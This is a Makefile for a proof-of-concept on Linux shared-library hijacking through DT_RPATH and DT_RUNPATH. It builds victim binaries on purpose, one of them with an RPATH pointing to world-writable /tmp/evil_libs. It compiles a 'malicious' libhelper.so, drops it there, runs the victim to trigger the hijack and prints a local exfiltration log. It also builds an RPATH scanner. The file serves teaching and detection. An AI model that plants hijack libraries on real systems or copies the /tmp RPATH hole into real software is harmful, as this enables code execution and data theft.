# DT_RPATH/DT_RUNPATH Exploitation POC - Makefile
#
# Usage:
#   make              - Build all components
#   make demo         - Run the full exploitation demo
#   make demo-safe    - Run victim with legitimate library
#   make demo-evil    - Run victim with hijacked library
#   make scan         - Scan the vulnerable binaries
#   make scan-system  - Scan system binaries (educational)
#   make clean        - Remove built files

CC = gcc
CFLAGS = -Wall -Wextra

# Directories
LEGIT_DIR = legit_libs
EVIL_DIR = hijack_libs

# Targets
VICTIM_RPATH = victim_rpath
VICTIM_RUNPATH = victim_runpath
VICTIM_ORIGIN = victim_origin
VICTIM_TMP = victim_tmp_rpath
LIBHELPER = libhelper.so
EVIL_LIBHELPER = evil_libhelper.so
SCANNER = rpath_scanner

.PHONY: all clean demo demo-safe demo-evil scan setup-dirs

all: setup-dirs $(SCANNER) build-victims build-libs

setup-dirs:
	@mkdir -p $(LEGIT_DIR)
	@mkdir -p $(EVIL_DIR)
	@mkdir -p /tmp/evil_libs 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════════════
# LIBRARIES
# ═══════════════════════════════════════════════════════════════════════════

build-libs: $(LEGIT_DIR)/$(LIBHELPER) $(EVIL_DIR)/$(LIBHELPER)

# Legitimate library
$(LEGIT_DIR)/$(LIBHELPER): libhelper.c
	$(CC) -shared -fPIC -o $@ $<
	@echo "[+] Built: $@ (legitimate library)"

# Evil library (same name, different content)
$(EVIL_DIR)/$(LIBHELPER): evil_libhelper.c
	$(CC) -shared -fPIC -o $@ $<
	@echo "[+] Built: $@ (malicious library)"
	@cp $@ /tmp/evil_libs/$(LIBHELPER) 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════════════
# VULNERABLE VICTIMS - Different RPATH scenarios
# ═══════════════════════════════════════════════════════════════════════════

build-victims: $(VICTIM_RPATH) $(VICTIM_RUNPATH) $(VICTIM_ORIGIN) $(VICTIM_TMP)

# Scenario 1: DT_RPATH with relative path (vulnerable if binary is moved)
$(VICTIM_RPATH): victim.c $(LEGIT_DIR)/$(LIBHELPER)
	$(CC) $(CFLAGS) -L$(LEGIT_DIR) -Wl,-rpath,$(LEGIT_DIR) \
		-Wl,--disable-new-dtags \
		-o $@ $< -lhelper
	@echo "[+] Built: $@ (DT_RPATH = $(LEGIT_DIR))"

# Scenario 2: DT_RUNPATH (searched after LD_LIBRARY_PATH)
$(VICTIM_RUNPATH): victim.c $(LEGIT_DIR)/$(LIBHELPER)
	$(CC) $(CFLAGS) -L$(LEGIT_DIR) -Wl,-rpath,$(LEGIT_DIR) \
		-Wl,--enable-new-dtags \
		-o $@ $< -lhelper
	@echo "[+] Built: $@ (DT_RUNPATH = $(LEGIT_DIR))"

# Scenario 3: $ORIGIN-based RPATH (relative to binary location)
$(VICTIM_ORIGIN): victim.c $(LEGIT_DIR)/$(LIBHELPER)
	$(CC) $(CFLAGS) -L$(LEGIT_DIR) -Wl,-rpath,'$$ORIGIN/$(LEGIT_DIR)' \
		-Wl,--disable-new-dtags \
		-o $@ $< -lhelper
	@echo "[+] Built: $@ (DT_RPATH = \$$ORIGIN/$(LEGIT_DIR))"

# Scenario 4: RPATH pointing to /tmp (world-writable!)
$(VICTIM_TMP): victim.c $(LEGIT_DIR)/$(LIBHELPER)
	$(CC) $(CFLAGS) -L$(LEGIT_DIR) -Wl,-rpath,/tmp/evil_libs \
		-Wl,--disable-new-dtags \
		-o $@ $< -lhelper
	@echo "[+] Built: $@ (DT_RPATH = /tmp/evil_libs) - VULNERABLE!"

# ═══════════════════════════════════════════════════════════════════════════
# SCANNER
# ═══════════════════════════════════════════════════════════════════════════

$(SCANNER): rpath_scanner.c
	$(CC) $(CFLAGS) -o $@ $<
	@echo "[+] Built: $@"

# ═══════════════════════════════════════════════════════════════════════════
# DEMONSTRATIONS
# ═══════════════════════════════════════════════════════════════════════════

demo: all demo-scan demo-safe demo-evil
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  EXFILTRATION LOG CONTENTS"
	@echo "════════════════════════════════════════════════════════════════"
	@cat /tmp/rpath_exfil.txt 2>/dev/null || echo "(no exfil log)"

demo-scan: $(SCANNER) build-victims
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 1: SCANNING VICTIMS FOR RPATH VULNERABILITIES"
	@echo "════════════════════════════════════════════════════════════════"
	./$(SCANNER) ./$(VICTIM_TMP)

demo-safe: $(VICTIM_RPATH) $(LEGIT_DIR)/$(LIBHELPER)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 2: RUNNING WITH LEGITIMATE LIBRARY"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	./$(VICTIM_RPATH)

demo-evil: $(VICTIM_TMP) $(EVIL_DIR)/$(LIBHELPER)
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  STEP 3: RUNNING WITH HIJACKED LIBRARY (via /tmp RPATH)"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo "  The victim binary has DT_RPATH=/tmp/evil_libs"
	@echo "  Our malicious libhelper.so is placed there!"
	@echo ""
	./$(VICTIM_TMP)

# Scan all built victims
scan: $(SCANNER) build-victims
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  SCANNING ALL VICTIM BINARIES"
	@echo "════════════════════════════════════════════════════════════════"
	./$(SCANNER) ./$(VICTIM_RPATH) ./$(VICTIM_RUNPATH) ./$(VICTIM_ORIGIN) ./$(VICTIM_TMP)

# Show RPATH of all victims using readelf
show-rpath: build-victims
	@echo ""
	@echo "════════════════════════════════════════════════════════════════"
	@echo "  DT_RPATH/DT_RUNPATH VALUES (via readelf)"
	@echo "════════════════════════════════════════════════════════════════"
	@echo ""
	@echo ">>> $(VICTIM_RPATH):"
	@readelf -d ./$(VICTIM_RPATH) 2>/dev/null | grep -E "RPATH|RUNPATH|NEEDED" || echo "  (none)"
	@echo ""
	@echo ">>> $(VICTIM_RUNPATH):"
	@readelf -d ./$(VICTIM_RUNPATH) 2>/dev/null | grep -E "RPATH|RUNPATH|NEEDED" || echo "  (none)"
	@echo ""
	@echo ">>> $(VICTIM_ORIGIN):"
	@readelf -d ./$(VICTIM_ORIGIN) 2>/dev/null | grep -E "RPATH|RUNPATH|NEEDED" || echo "  (none)"
	@echo ""
	@echo ">>> $(VICTIM_TMP):"
	@readelf -d ./$(VICTIM_TMP) 2>/dev/null | grep -E "RPATH|RUNPATH|NEEDED" || echo "  (none)"

# Show library search order
search-order: $(SCANNER)
	./$(SCANNER) --search-order

clean:
	rm -rf $(LEGIT_DIR) $(EVIL_DIR)
	rm -f $(VICTIM_RPATH) $(VICTIM_RUNPATH) $(VICTIM_ORIGIN) $(VICTIM_TMP)
	rm -f $(SCANNER)
	rm -f /tmp/evil_libs/$(LIBHELPER) 2>/dev/null || true
	rm -f /tmp/rpath_exfil.txt 2>/dev/null || true
	@echo "[+] Cleaned"
